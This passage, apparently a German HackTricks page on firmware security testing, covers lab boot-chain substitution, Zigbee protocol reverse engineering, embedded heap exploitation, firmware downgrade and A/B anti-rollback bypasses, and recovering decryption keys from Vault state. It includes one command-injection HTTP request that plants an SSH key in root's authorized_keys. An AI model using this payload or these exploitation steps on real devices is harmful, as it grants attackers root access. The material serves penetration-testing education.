2. Verketten oder mappen Sie die Bereiche, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuchen Sie nur einen kleinen Bereich um die vorhergesagte Grenze und verlangen Sie mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt allein einen plausiblen Superblock zu akzeptieren.
4. Führen Sie ein unverändertes `unsquashfs` für das rekonstruierte Abbild aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root-System gestartet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines, statisch gelinktes Init ersetzt wird. Dies ist eine **Bootchain-Substitution im Labor** und kein Bruch von dm-verity, seiner RSA-Signatur, Secure Boot oder eines TPM-gebundenen Schlüssels.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die betrieblichen Teile des ursprünglichen Bootpfads nachbilden: `devtmpfs` einhängen, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` einhängen, auf das bereitgestellte Blockgerät warten, das bearbeitete Root-Dateisystem schreibgeschützt einhängen, die Pseudo-Dateisysteme des alten Root-Dateisystems aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Wenn `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt werden, wird vermieden, dass versehentlich Mountpunkte ausgehängt werden, die zum neuen Root-Dateisystem gehören.<sup>[[11]](#references)</sup>

Halten Sie den veränderlichen Gerätezustand getrennt vom modifizierten unveränderlichen Root-Dateisystem. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers bewahren, während ein zweiter schreibgeschützter virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Gasts, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlerursache verschleiern. Binde niemals ein Overlay ein, das eine laufende VM verwendet; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Zur reproduzierbaren Fehlerisolierung sollten zeitgestempelte Markierungsdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und kurzlebige Konsolen können durch Rate-Limiting oder einen vorzeitigen Prozessabbruch zu falsch-negativen Ergebnissen führen. Vergleichen Sie außerdem die exakten Schnittstellen über die verschiedenen Ebenen hinweg, bevor Sie nicht zusammenhängenden Code ändern: `uname -r` mit `/lib/modules/`, die ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Generation von Mesa-`libGL` mit der DRI-Treiber-ABI sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich mit `dlopen()` geladen werden, aber dennoch unbrauchbar bleiben, weil der Verbraucher eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine reale oder eine emulierte Geräteumgebung verwendet. Es ist wichtig, den Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentlich ein Neustart der Emulation erforderlich ist. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu erkennen.

## Laufzeitanalysetechniken

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dabei kommen Tools wie gdb-multiarch, Frida und Ghidra zum Einsatz, um Breakpoints zu setzen und Schwachstellen mithilfe von Fuzzing und anderen Techniken zu identifizieren.

Für Embedded-Ziele ohne vollständigen Debugger **kopieren Sie einen statisch gelinkten `gdbserver`** auf das Gerät und verbinden Sie sich remote:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Prozessor-Nachrichtenmapping

Bei IoT-Hubs ist der RF-Stack oft auf einen **Radio-MCU** und einen Linux-Userland-Prozess aufgeteilt. Ein sinnvoller Workflow ist, den Pfad nachzuverfolgen:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serial-/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Ziele für das Reverse Engineering statt nur eines. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten vom **Netzwerk** und welche vom Controller selbst stammen können
- Die genauen **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Speziell bei Zigbee: Zeichne den Pairing-Verkehr auf und prüfe, ob das Ziel noch den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden des Commissioning-Verkehrs den **Network Key** offenlegen. Zigbee 3.0-Installationscodes verringern dieses Risiko; halte also fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung erreichen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse-Engineere den Command-Dispatcher, bis du den **nur für den Hersteller vorgesehenen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Finde **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Error-Zweige, die schließlich den vom Angreifer kontrollierten Zustand zurücksetzen oder freigeben.
- Stelle fest, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, der fehlerhafte Handler sei immer erreichbar.

Bei zeitkritischen Protokollen kann die Paketwiedergabe mit einem Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem herstellerspezifischen Stack zu emulieren, damit die korrekten **Endpunkte**, **Attribute** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse: fragmentierte Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurationsdownloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Bei späteren Fragmenten werden nur die vom Angreifer kontrollierten **paketlokalen** Felder validiert, etwa `packet_total_size >= offset + chunk_len`.
3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` verwendet, ohne die **ursprünglich allokierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und dennoch den ursprünglich allokierten Puffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit genügend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell- oder Blob-Download-Zustand zu versetzen.

### Protokollgesteuerte `free()`-Auslöser

Bei Embedded-Daemons lässt sich Heap-Metadaten-Exploitation oft am einfachsten nicht durch „auf das Cleanup warten“, sondern dadurch auslösen, dass man die **eigene Fehlerbehandlung des Protokolls erzwingt**:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-Zustände** zu versetzen.
- Überschreite den Retry-Grenzwert, sodass der Daemon den **Kontext zurücksetzt** und den beschädigten Puffer freigibt.
- Nutze dieses vorhersagbare `free()`, um allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich gegen **musl-/uClibc-/dlmalloc-ähnliche** Allokatoren in Embedded Linux, bei denen beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in eine Schreibprimitive verwandeln können. Ein stabiles Muster besteht darin, ein **Größenfeld** zu beschädigen, um die Traversierung des Allokators auf **Fake-Chunks innerhalb des übergelaufenen Puffers** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess abstürzen zu lassen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in Low-Level-Sprachen. Schutzmechanismen der Binary-Runtime sind in Embedded-Systemen selten; wenn sie vorhanden sind, können jedoch Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins und Konsolidierung:** uClibc verwendet Fastbins, ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen; daher muss jeder Fake-Chunk Prüfungen bestehen (plausible Größe, `fd = 0` und benachbarte Chunks, die als „in Verwendung“ gelten).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries mit ASLR:** Wenn ASLR aktiviert, das Haupt-Binary aber **nicht-PIE** ist, sind Adressen innerhalb des Binaries in `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** zu lenken.
- **NUL-Byte zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` in der Payload das Parsing stoppen und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-Geräten (IoT) unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ein auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Sicherheitstests, das bereits mit Tools für Firmware-Sicherheitstests ausgestattet ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades) häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader die Signatur nur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer legitimerweise eine **ältere, verwundbare Firmware mit gültiger Signatur installieren** und so bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffs-Workflow:

1. **Ein älteres signiertes Image beschaffen**
   * Von einem öffentlichen Download-Portal, CDN oder der Support-Website des Herstellers herunterladen.
   * Aus zugehörigen Mobil-/Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` in einem Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. abrufen.
2. **Das Image über einen verfügbaren Update-Kanal auf das Gerät hochladen oder dort bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele Consumer-IoT-Geräte stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und eine Recovery bzw. ein Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in einer neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um nach Erlangung von Persistenz nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (heruntergestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch beliebige Befehle eingeschleust werden können (hier: SSH-Zugriff als root per Schlüssel aktivieren). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch da ein Schutz vor Downgrades fehlt, ist die Fehlerbehebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind im APK/APEX häufig unverschlüsselt unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Umgehung des Anti-Rollback-Schutzes bei A/B-Slot-Designs

Einige Hersteller implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur in der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen Userspace-OTA-Agenten). Prüft der **Bootloader** später nur die Image-Signatur/CRC und vertraut der Partitionstabelle oder den Slot-Metadaten, lässt sich der Rollback-Schutz trotzdem umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem in persistentem Speicher abgelegten Wert und weist ältere signierte Images zurück.
- Der Bootloader **wertet diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbezogenen Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht in Dual-Slot-Systemen eine Primitive nach dem Muster **ein Image validieren / ein anderes Image booten**. Kann der Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel festzulegen und Slot B anschließend vor dem Neustart zu überschreiben, bootet der Bootloader möglicherweise trotzdem das heruntergestufte Image, da er nur den bereits gespeicherten Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot laden und die normale Validierungs-/Umschaltroutine ausführen, damit das Layout diesen Slot als nächstes aktives Ziel festlegt.
2. **Noch nicht neu starten**. In derselben Sitzung erneut die Slot-Vorbereitungs-/Löschroutine aufrufen.
3. Veralteten Boot-Status oder veraltete Slot-Auswahl-Logik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand eines veralteten Status statt des **aktuell gespeicherten Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, die den Slot auch dann als bootfähig markieren, wenn sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturprüfung durch ROM-Code)?
* Setzt der **Bootloader denselben Ratchet wie der Updater durch**, statt nur Signatur/CRC zu prüfen?
* Sind die Metadaten zur Slot-Aktivierung **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Wechsel zu einem Neustart gezwungen, oder sind weitere Update-/Löschroutinen in derselben Sitzung noch erreichbar?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Schutzmechanismen, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, eignen sich die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Status

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Entropie-reichen Blob kombiniert, sollte vor jedem Brute-Force-Versuch zunächst eine Container-Triage erfolgen:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` deutet üblicherweise auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starkes Indiz dafür, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort/einen Sitzungsschlüssel verschlüsselt.
- Abgetrenntes PGP-Material in derselben Datei dient oft nur dem Schutz der Authentizität; gehe nicht davon aus, dass es für die Vertraulichkeit zuständig ist.

Wenn die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** zurückentwickelt werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater/die Verwaltungs-Binärdatei dekompilieren und nachvollziehen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entschlüsselt und welchen logischen Schlüsselnamen sie anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Status (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte wie privates Schlüsselmaterial behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es meist einfacher, diese Umgebung nachzustellen, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Keys nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Key exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Key mit genau dem Padding-/Hash-Paar testen, das vom KMS verwendet wird. Ein fehlgeschlagener PKCS#1-v1.5-Decrypt und ein fehlgeschlagener standardmäßiger OAEP-Decrypt beweisen **nicht**, dass der Key falsch ist; viele Vault-gestützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Beginnt der Payload mit `Salted__`, muss vor dem Versuch einer AES-CBC-Entschlüsselung die OpenSSL-KDF des Herstellers exakt reproduziert werden (`EVP_BytesToKey`, bei älteren Geräten oft MD5).

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **die operativen Keys auf dem Gerät wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline reproduzieren**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Fähigkeiten auf Senior-Level, Autonomie auf Junior-Level](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in vernachlässigter Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Umgehung des Anti-Downgrade-Schutzes](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debuggen und Beheben](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht Wiederherstellung aus SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tools zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security – Hardware-Hacking auffrischen, Teil 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
